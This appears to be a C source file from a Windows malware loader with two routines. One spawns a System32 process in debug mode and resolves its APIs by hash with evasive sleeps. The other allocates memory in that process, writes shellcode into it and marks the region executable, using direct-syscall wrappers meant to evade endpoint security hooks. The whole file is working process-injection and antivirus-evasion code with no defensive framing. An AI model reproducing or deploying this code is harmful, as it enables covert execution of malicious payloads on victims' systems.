#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#include "functions.h"
#include "whispers.h"

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		//printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// API Hashing
	cCPA cCPAu = (cCPA) GetProcAddressH(GetModuleHandleH(#-KERNEL32_VALUE-#), #-CREATEPROCESSA_VALUE-#);

	Sleep(15000);
	if(!cCPAu(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS, // Instead of CREATE_SUSPENDED
		NULL,
		NULL,
		&Si,
		&Pi)) {
	
		return FALSE;
	}

	
	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	Sleep(5000);
	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

	SIZE_T		sNumberOfBytesWritten		= 0,
				sSize						= sSizeOfShellcode;
	ULONG		uOldProtection				= 0;
	NTSTATUS	STATUS						= 0x00;

	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {

		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	//printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);

	if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {

		printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	Sleep(2500);
	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {

		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Successfully changed memory region permission to RWX!\n");

	return TRUE;

}